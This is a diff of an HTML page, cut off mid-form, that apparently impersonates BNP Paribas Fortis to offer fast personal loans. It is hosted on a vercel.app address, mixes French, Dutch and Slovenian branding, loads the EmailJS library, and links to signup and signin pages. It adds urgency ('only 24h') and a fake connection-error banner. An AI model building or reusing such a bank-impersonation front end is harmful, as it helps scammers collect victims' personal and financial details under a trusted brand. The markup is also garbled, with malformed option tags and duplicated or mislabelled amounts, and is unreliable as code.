@@ -1,85 +1,1182 @@
-<!DOCTYPE html>
-<html>
 
-<head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="stylesheet" href="Loan.css">
-        <title></title>
-</head>
+<!doctype html>
+<html lang="si">
+  <head>
+    <!-- Returning visitor: false -->            
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BNP PARIBAS FORTIS PRÊT</title>
+    <meta name="keywords" content="lening berekenen"/>
+      <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    <meta name="description" content="Preden najamete posojilo, želite vedeti, koliko si lahko izposodite. Posojilo lahko izračunate na Posojsi.com."/>
+    <script type="application/ld+json">
+        {
+          "@context": "https://schema.org",
+          "@type": "Organization",
+          "name": "Posojsi.com",
+          "address": {
+            "@type": "PostalAddress",
+            "streetAddress": "Beethovnova ulica SI-1000 Ljubljana",
+            
+            
+            
+            "addressCountry": "Nederland"
+          },
+          "url": "https://www.posojsi.com/",
+        }
+    </script>
 
-<body>
-        div class="menu">
-     <div class="list-drl">
-       <div class="list-item">
-         <li>Accueil</li>
+    <link rel="preload" as="image" href="/global/images/jumbotron-round.png">
+    <link rel="preload" as="image" href="/global/images/jumbotron-round_smaller.jpg">
+
+    <style type="text/css">
+      a#CybotCookiebotDialogPoweredbyCybot,
+      div#CybotCookiebotDialogPoweredByText {
+        display: none;
+      }
+
+      #CookiebotWidget .CookiebotWidget-body .CookiebotWidget-main-logo {
+        display: none;
+      }
+
+      .form-control {
+        display: block;
+        width: 100%;
+        padding: .375rem .75rem;
+        font-size: 1rem;
+        font-weight: 400;
+        line-height: 1.5;
+        color: var(--bs-body-color);
+        appearance: none;
+        background-color: var(--bs-body-bg);
+        background-clip: padding-box;
+        border: var(--bs-border-width) solid var(--bs-border-color);
+        border-radius: var(--bs-border-radius);
+        transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+    }
+    .jVpYzf {
+        position: relative;
+        display: inline-flex;
+        -webkit-box-align: center;
+        align-items: center;
+        box-sizing: border-box;
+        max-width: 100%;
+        border: 1px solid rgb(191, 191, 191);
+        border-radius: 3px;
+        background-color: white;
+        width: 100%;
+        height: 48px;
+        font-size: 18px;
+        color: var(--gray-900);
+        font-weight: 600;
+        -webkit-font-smoothing: antialiased;
+        padding-left: 12px ;
+        margin-right: 300px ;
+    }
+    body{
+      margin: 0px;
+      overflow-x: hidden;
+    }
+    .simulateur {
+      display: flex;
+    flex-direction: column;
     
-       </div>
-       <div class="list-item">
-         <li>Signup</li>
-       </div>
-       <div class="list-item">
-         <li>BankAccount</li>
-       </div>
-     </div><div></div>
-    <div class="menu-logo">
-
-  <div class="imgbank">
+      align-items: center;
+      margin: 0px;
+padding: 20px 20px;
+color:white;
+      background: seagreen;
+    }
+    .simulateur h3{
+      font-size: 20px;
+      margin-bottom: 10px;
+     
+      color: white;
+    }
+    .sml-text,.sml-rmbr{
+      margin:0px 30px;
+       font-size: 20px;
+    }
+   .bgr-grey{
+     background:whitesmoke;
+     height:50px;
+     width:100%;
+     box-shadow: 2px 2px 8px black;
   
+   }
+   .projet{
+     display: flex;
+     flex-direction: column;
+     justify-items: center;
+     align-items: center;
+     text-align: center;
+     font-size: 20px;
+   
+     margin-bottom: 10px;
+   }
+   .projet-text{
+     margin: 10 0px;
+   }
+   .projet-head h4{
+    color: seagreen;
+    font-size: 20px;
+   }
+   /*.row-80{
+     
+     height:1px;
+     border-radius: 0px;
+     width:100%;
+     margin: 20px auto;
+     background:lightgrey;
+   }*/
+   .row-50{
+    height: 1px;
+    border-radius: 0px;
+    width:100%;
+    margin: 0 auto;
+    background:lightgrey;
+   }
+   nav{ 
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+   
+   }
+   .list-drl{
+     position: absolute;
+   left: 0px;
+   right: 0px;
+z-index: 999;
+top: 80px;
+   padding: 20px 0px;
+  margin: 60px 0px;
+     display:none;
+     background:whitesmoke;
+     flex-direction: column;
+   
+     align-items:center;
+     opacity: 0;
+    transition: top opacity transform 5s ease;
+  
+     color: seagreen;
+     
+   }
+.list-drl li{
+  
+  list-style: none;
+ width: 363px;
+ text-align: center;
+  margin: 20px 0px;
+  background: white;
+  background: white;
+
+}
+.list-drl li a{
+ 
+  text-decoration: none;
+list-style: none;
+display: block;
+width:100%;
+color: seagreen;
+border-radius: 8px;
+text-align: center;
+font-size: 20px;
+padding: 8px 0px;
+}
+.list-drl li a:hover{
+  list-style: none;
+  background: white;
+  padding: 8px 0px;
+  width:363px;
+  border-radius: 4px;
+  background: seagreen;
+  color: whitesmoke;
+}
+   .imgbank h1 {
+    color: seagreen;
+    font-size: 20px;
+    font-style: italic;
+   
+    text-shadow: 2px 2px 8px seashell;
+   text-transform: uppercase;
+   }
+   .menu .menu-logo{
+
+ 
+
+   
+   
+   }
+   .menu-nav div{
+   
+ 
+   width:50px;
+   padding: 5px 20px;
+     margin: 30px;
+     font-size: 20px;
+     color:white;
+     text-decoration: none;
+     border:1px solid whitesmoke;
+   background: seagreen;
+     border-radius: 4px;
+   }
+   
+    .menu-nav {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      top: 5px;
+   
+   
+   
+   
+    }
+   
+    .menu-nav i {
+      display: block;
+   
+    }
+ @import url('https://fonts.googleapis.com/css2?family=Edu+AU+VIC+WA+NT+Hand:wght@400..700&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap');
+    #isCompte{
+   display: flex;
+   flex-direction:column;
+justify-content: center;
+   align-items: center;
+   position: fixed;
+ color:red;
+ 
+   letter-spacing: 5px;
+   
+   z-index: 900;
+   top:-400px;
+   left: 0px;
+   text-align: center;
+   background:white;
+  
+ font-family: "Rubik", sans-serif;
+  
+ 
+  
+   transition :top 3s ease;
+  width: 100%;
+   border-bottom: 2px solid lightgray;
+ }
+.fa{
+  
+  display: flex;
+  justify-content: center;;
+  align-items: center;
+
+ letter-spacing: 5px;
+ font-size: 20px;
+  
+
+  
+  
+}
+   
+    </style>
+
+    <meta name="facebook-domain-verification" content="di68j8dw6rnuy6dpkurc0y24bq5blq" />
+
+    <!-- End VWO Async SmartCode -->    
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.posojsi.com/global/images/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://www.posojsi.com/global/images/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.posojsi.com/global/images/icons/favicon-16x16.png">
+    <link rel="manifest" href="https://www.posojsi.com/global/images/icons/site.webmanifest">
+    <link rel="mask-icon" href="https://www.posojsi.com/global/images/icons/safari-pinned-tab.svg" color="#5bbad5">
+    <link rel="shortcut icon" href="https://www.posojsi.com/global/images/icons/favicon.ico">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="msapplication-config" content="/global/images/icons/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">            
+    <script type="text/javascript" src="/global/js/vendor/jquery/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="/global/css/base.css">
+    <link rel="stylesheet" href="https://www.posojsi.com/primeicons-master/demo-files/demo.css">
+    <script src="https://kit.fontawesome.com/779f88c1ba.js" crossorigin="anonymous"></script>   
+    
+  </head>
+  <body>
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TSRNLP"
+        height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+        <div id="isCompte">
+    
+      
+     <h2>Opération échoué </h2> 
+     <div>
+      Veillez réessayer et vérifiez si votre connexion Wi-Fi est allumée ou bonne
+      </div>
+      <div style="margin: 30px;text-align: center">
+       <i style="font-size:50px;" class="fa">&#xf058;</i>
+      </div>
+   
+  </div>
+
+  <div id="google_translate_element"></div>
+    <nav>
+        
+  <div class="imgbank">
+   
       <h1>BNP Paribas Fortis</h1>
        
         
   </div>
 
+    
+  
+      <div class="menu-nav">
+      
+     
+                <div href id="hover-list"><i style="font-size:24px;text-align: center" class="fa">&#xf0c9;</i>
+                </div>
+      </div>
+
+    </nav>
+
+
+ <div class="menu">
+
+   <div class="list-drl">
+     <div class="list-item">
+       <li> <a href="https://bnpparibas-nine.vercel.app/  ">Accueil</a></li>
+
+     </div>
+     <div class="list-item">
+       <li><a href="https://bnpparibas-nine.vercel.app/signup ">Signup</a></li>
+     </div>
+     <div class="list-item">
+       <li><a href="https://bnpparibas-nine.vercel.app/ssignin">SignIn</a></li>
+     </div>
+
+
+     <div class="list-item">
+       <li><a href="https://bnpparibas-nine.vercel.app/account">Account</a></li>
+     </div>
+     <div class="list-item">
+       <li><a href="https://bnpparibas-nine.vercel.app/loan">Obtenir un crédit</a></li>
+
+
+
+     </div>
+
+   </div>
+  </div>
+        
+  <div class="simulateur">
+    <div class="sml-head">
+      <h3>simulateur crédit personnel</h3>
     </div>
- <div class="container">
-         <div class="app-name">
-                 <h3>Loan Calculator</h3>
-         </div>
+    <div class="sml-text">
+      Un crédit vous engage et doit être remboursé.
+    </div>
+    <div class="sml-rmbr">
+      Vérifiez vos capacités de remboursement avant de vous engager.
+    </div>
+  </div>
+  <div class="bgr-grey">
+    
+  </div>
+  <div class="projet">
+    <div class="projet-head">
+      <h4>Concrétisez vos projets avec le crédit personnel BNP Paribas</h4>
+    </div>
+    <div class="projet-text">
+      Simulez votre crédit financier et effectuez votre demande en ligne en quelques cliques 
+      <div style="margin: 15px">
+        vous n'avez que 24h pour obtenir un crédit chez vous.
+        <div>
+          
+       
+        <div style="margin:15px">
+          Vivons cet moment inédit ensemble 
+        </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+ <form action="" method="GET">  
+ 
+<div class="calculator-container mb-4 mt-4" style="background: white">
+    <div class="row-50">
+  
+    </div>
+    <h4 class="calc-headline" style="text-align:center;color:seagreen"><font ><font ><font ><font >Quel est le montant que vous souhaitez emprunter ?</font></font></font></font></h4>
+  
+    <div class="row mb-5 mt-3">
+        <div class="col-sm-16 position-relative ">
+      <div class="field__control">
+      <div class="SelectContainer-sc-2taqqp-3 select-field" style="margin: 10px;">
+  <select id="applicant0.loan.selection.amount" name="montant" required="" class="jVpYzf StyledSelect-sc-2taqqp-1" style="text-align: center;" >
+  <option class="op" value="1000" alias=""><font ><font >1.000  <div class="moneyo">
+    
+  </div></font></font></option class=""><option class="op" value="1500" alias=""><font ><font >1.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="2000" alias=""><font ><font >2.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="2500" alias=""><font ><font >2.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="3000" alias=""><font ><font >3.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="3500" alias=""><font ><font >3.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="4000" alias=""><font ><font >4.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="4500" alias=""><font ><font >4.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="5000" alias=""><font ><font >5.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="5500" alias=""><font ><font >5.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="6000" alias=""><font ><font >6.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="6500" alias=""><font ><font >6.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="7000" alias=""><font ><font >7.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="7500" alias=""><font ><font >7.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="8000" alias=""><font ><font >8.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="8500" alias=""><font ><font >8.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="9000" alias=""><font ><font >9.000  <div class="money">
+    
+  </div></font></font></option class="op"><option class="op" value="9500" alias=""><font ><font >9.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="10000" alias=""><font ><font >10.000  <div class="money">
+    
+  </div></font></font></option class="op"><option class="op" value="10500" alias=""><font ><font >10.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="11000" alias=""><font ><font >11.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="11500" alias=""><font ><font >11.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="12000" alias="op"><font ><font >12.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="12500" alias=""><font ><font >12.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="13000" alias=""><font ><font >13.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="13500" alias=""><font ><font >13.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="14000" alias=""><font ><font >14.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="14500" alias=""><font ><font >14.500  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="15000" alias=""><font ><font >15.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="16000" alias=""><font ><font >16.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="17000" alias=""><font ><font >17.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="18000" alias=""><font ><font >18.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="19000" alias=""><font ><font >19.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="20000" alias=""><font ><font >20.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="21000" alias=""><font ><font >21.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="22000" alias=""><font ><font >22.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="23000" alias=""><font ><font >23.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="24000" alias=""><font ><font >24.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="25000" alias=""><font ><font >25.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="26000" alias=""><font ><font >26.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="27000" alias=""><font ><font >27.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="28000" alias=""><font ><font >28.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="29000" alias=""><font ><font >29.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="30000" alias=""><font ><font >30.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="31000" alias=""><font ><font >31.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="32000" alias=""><font ><font >32.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="33000" alias=""><font ><font >33.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="34000" alias=""><font ><font >34.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="35000" alias=""><font ><font >35.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="36000" alias=""><font ><font >36.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="37000" alias=""><font ><font >37.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="38000" alias=""><font ><font >38.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="39000" alias=""><font ><font >39.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="40000" alias=""><font ><font >40.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="41000" alias=""><font ><font >41.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="42000" alias=""><font ><font >42.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="43000" alias=""><font ><font >43.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="44000" alias=""><font ><font >44.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="45000" alias=""><font ><font >45.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="46000" alias=""><font ><font >46.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="47000" alias=""><font ><font >47.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="48000" alias=""><font ><font >48.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="49000" alias=""><font ><font >49.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="50000" alias=""><font ><font >50.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="51000" alias=""><font ><font >51.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="52000" alias=""><font ><font >52.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="53000" alias=""><font ><font >53.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="54000" alias=""><font ><font >54.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="55000" alias=""><font ><font >55.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="56000" alias=""><font ><font >56.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="57000" alias=""><font ><font >57.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="58000" alias=""><font ><font >58.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="59000" alias=""><font ><font >59.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="60000" alias=""><font ><font >60.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="61000" alias=""><font class="currency" ><font >61.000  
+    </font></font></option class=""><option class="op" value="71000" alias=""><font ><font >71.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="72000" alias=""><font ><font >72.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="73000" alias=""><font ><font >73.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="74000" alias=""><font ><font >74.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="75000" alias=""><font ><font >75.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="76000" alias=""><font ><font >76.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="77000" alias=""><font ><font >77.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="78000" alias=""><font ><font >78.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="79000" alias=""><font ><font >79.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="80000" alias=""><font ><font >80.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="81000" alias=""><font ><font >81.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="82000" alias=""><font ><font >82.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="" value="83000" alias=""><font ><font >83.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="84000" alias=""><font ><font >84.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="85000" alias=""><font ><font >85.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="86000" alias=""><font ><font >86.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="87000" alias=""><font ><font >87.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="88000" alias=""><font ><font >88.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="89000" alias=""><font ><font >89.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="90000" alias=""><font ><font >90.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="91000" alias=""><font ><font >91.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="92000" alias=""><font ><font >92.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="93000" alias=""><font ><font >93.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="94000" alias=""><font ><font >94.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="95000" alias=""><font ><font >95.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="96000" alias=""><font ><font >96.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="97000" alias=""><font ><font >97.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="98000" alias=""><font ><font >98.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="99000" alias=""><font ><font >99.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="100000" alias=""><font ><font >100.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="101000" alias=""><font ><font >101.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="102000" alias=""><font ><font >102.000  <div class="money">
+    
+  </div></font></font>
+  </option class="">
+  <option class="op" value="103000" alias=""><font ><font >103.000 </font ></font>
+  </option class="op">
+  <option class="op" value="104000" alias=""><font ><font >104.000</font></font></option class="">
+  <option class="op" value="105000" alias=""><font ><font >105.000 </font></font></option class=""><option class="op" value="106000" alias=""><font ><font >106.000</font></font></option class=""><option class="op" value="107000" alias=""><font ><font >107.000</font></font></option class="">
+  <option class="op" value="108000" alias=""><font ><font >108.000  ></font></font></option class="">
+  <option class="op" value="109000" alias=""><font ><font >109.000</font></font></option class="">
+  <option class="op" value="110000" alias=""><font ><font >110.000</font></font></option class="">
+  <option class="op" value="111000" alias=""><font ><font >111.000 </font></font></option class="">
+  <option class="op" value="112000" alias=""><font ><font >112.000 </font></font></option class=""><option class="op" value="113000" alias=""><font ><font >113.000  </font></font></option class=""><option class="op" value="114000" alias=""><font ><font >114.000</font></font></option class=""><option class="op" value="115000" alias=""><font ><font >115.000  </font></font></option class=""><option class="op" value="116000" alias=""><font ><font >116.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="117000" alias=""><font ><font >117.000</font></font></option class=""><option class="op" value="118000" alias=""><font ><font >118.000 </font></font></option class=""><option class="op" value="119000" alias=""><font ><font >119.000  </font></font></option class=""><option class="op" value="120000" alias=""><font ><font >120.000</font></font></option class=""><option class="op" value="121000"><font ><font >121.000  </font></font></option class=""><option class="op" value="122000"><font ><font >122.000  </font></font></option class=""><option class="op" value="123000">
+    <font ><font >123</font></font></option class="">
+    <option class="op" value="124000"><font ><font >124.000 </font></font></option class="">
+    <option class="op" value="126000"><font ><font >126.000  </font></font></option class="">
+    <option class="op" value="127000"><font ><font >127.000  </font></font></option class="">
+    <option class="op" value="128000"><font ><font >128.000  </font></font></option class="">
+    <option class="op" value="129000"><font ><font >129.000  </font></font></option class=""><option class="op" value="130000"><font ><font >130.000  </font></font></option class=""><option class="op" value="131000"><font ><font >131.000</font></font></option class=""><option class="op" value="132000"><font ><font >132.000  </font></font></option class=""><option class="op" value="133000"><font ><font >133.000  </font></font></option class=""><option class="op" value="134000"><font ><font >134.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="135000"><font ><font >135.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="136000"><font ><font >136.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="137000"><font ><font >137.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="138000"><font ><font >138.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="139000"><font ><font >139.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="140000"><font ><font >140.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="141000"><font ><font >141.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="142000"><font ><font >142.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="143000"><font ><font >143.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="144000"><font ><font >144.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="145000"><font ><font >145.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="146000"><font ><font >146.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="147000"><font ><font >147.000  <div class="money">
+    
+  </div></font></font></option class="">
+  <option class="op" value="148000"><font ><font >148.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="149000"><font ><font >149.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="140000"><font ><font >140.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="150000"><font ><font >150.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="155000"><font ><font >150.000  <div class="money">
+    
 
-         <fieldset class="fieldset-one">
-                 <legend>Loan amount</legend>
-                 <span>₹</span>
-                 <input type="number" class="loan-amount-input" placeholder="0">
-         </fieldset>
+  </div></font></font></option class=""><option class="op" value="160000"><font ><font >160.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="165000"><font ><font >165.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="170000"><font ><font >170.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="175000"><font ><font >175.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="180000"><font ><font >180.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="185000"><font ><font >185.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="190000"><font ><font >190.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="195000"><font ><font >195.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="200000"><font ><font >200.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="210000"><font ><font >210.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="220000"><font ><font >220.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="240000"><font ><font >240.000  <div class="money">
+    
+  </div></font></font></option class="" ><option class="op"  value="250000"><font ><font >250.000 </font></font></option class=""><option class="op" value="260000"><font ><font >260.000 </font></font></option class=""><option class="op" value="270000"><font ><font >270.000  </font></font></option class=""><option class="op" value="280000"><font ><font >280.000 </font></font></option class=""><option class="op" value="290000"><font ><font >290.000  </font></font></option class=""><option class="op" value="300000"><font ><font >300.000 </font></font></option class=""><option class="op" value="350000"><font ><font >350.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="400000"><font ><font >400.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="450000"><font ><font >450.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="500000"><font ><font >500.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="550000"><font ><font >550.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="600000"><font ><font >600.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="650000"><font ><font >650.000  <div class="money">
+    
+  </div></font></font></option class=""><option class="op" value="700000"><font ><font >700.000  </font></font></option class=""><option class="op" value="750000"><font ><font >750.000  </font></font></option class=""><option class="op" value="800000"><font ><font >800.000  </font></font></option class=""><option class="op" value="850000"><font ><font >850.000  </font></font></option class=""><option class="op" value="900000"><font ><font >900.000  </font></font></option class="op"><option class="op" value="950000"><font ><font >950.000  
+    
+  </div></font></font></option class=""><option class="op" value="1000000"><font ><font >1.000.000 
+    
+  </font></font></option class="">
+                                </select>
+                                
+                        </div>
+                        </div>
+        </div>
+      
+    </div>
 
-         <fieldset class="fieldset-two">
-                 <legend>Loan term</legend>
-                 <span>Years</span>
-                 <input type="number" class="loan-term-input" placeholder="0">
-         </fieldset>
+    <h4 id="waarvoor-title" class="calc-headline waarvoor-title" style="text-align:center;color:seagreen"><font ><font ><font ><font > Combien de temps ?</font></font></font></font><a id="SpendingPurpose-error" style="display:none;" class="tooltip-btn error" data-bs-toggle="tooltip" data-bs-placement="right" title="" data-bs-original-title="Dit veld is verplicht"><font ><font ><font ><font >
+                !
+            </font></font></font></font></a></h4>
+<div class="row mb-5 mt-3">
 
-         <fieldset class="fieldset-three">
-                 <legend>Interest rate</legend>
-                 <span>%</span>
-                 <input type="number" class="interest-rate-input" placeholder="0">
-         </fieldset>
-         <button class="calculate-btn">Calculate</button>
-         <div class="result">
-                 <table>
-                         <tr>
-                                 <td>Loan amount</td>
-                                 <td class="loan-amount"></td>
-                         </tr>
+        <div class="col-sm-16 position-relative ">
+  <div class="field__control">
+    <div class="SelectContainer-sc-2taqqp-3 select-field" style="margin:10px;">
+    <select id="applicant0.loan.selection.duration" name="duration" required="" class="jVpYzf StyledSelect-sc-2taqqp-1"style="text-align:center">
+     <option class="" value="12" alias=""><font ><font >12 mois</font></font></option class="">
+         <option class="" value="24" alias=""><font ><font >24 mois</font></font></option class="">
+      <option class="" value="36" alias=""><font ><font >36 mois</font></font></option class="">
+                                <option class="" value="48" alias=""><font ><font >48 mois</font></font></option class="">
+                                <option class="" value="60" alias=""><font ><font >60 mois</font></font></option class="">
+                                <option class="" value="72" alias=""><font ><font >72 mois</font></font></option class="">
+                                <option class="" value="84" alias=""><font ><font >84 mois</font></font></option class="">
+                                <option class="" value="96" alias=""><font ><font >96 mois</font></font></option class="">
+                                <option class="" value="108" alias=""><font ><font >108 mois</font></font></option class="">
+                                <option class="" value="120" alias=""><font ><font >120 mois</font></font></option class="">
+                                <option class="" value="156"><font ><font >156 mois</font></font></option class="">
+                                <option class="" value="168"><font ><font >168 mois</font></font></option class="">
+                                <option class="" value="182"><font ><font >182 mois</font></font></option class="">
+                                <option class="" value="192"><font ><font >192 mois</font></font></option class="">
+                                <option class="" value="204"><font ><font >204 mois</font></font></option class="">
+                                <option class="" value="216"><font ><font >216 mois</font></font></option class="">
+                                <option class="" value="228"><font ><font >228 mois</font></font></option class="">
+                                <option class="" value="240"><font ><font >240 mois</font></font></option class="">
+                                <option class="" value="252"><font ><font >252 mois</font></font></option class="">
+                                <option class="" value="264"><font ><font >264 mois</font></font></option class="">
+                                <option class="" value="276"><font ><font >276 mois</font></font></option class="">
+                                <option class="" value="288"><font ><font >288 mois</font></font></option class="">
+                                <option class="" value="300"><font ><font >300 mois</font></font></option class="">
+                                <option class="" value="312"><font ><font >312 mois</font></font></option class="">
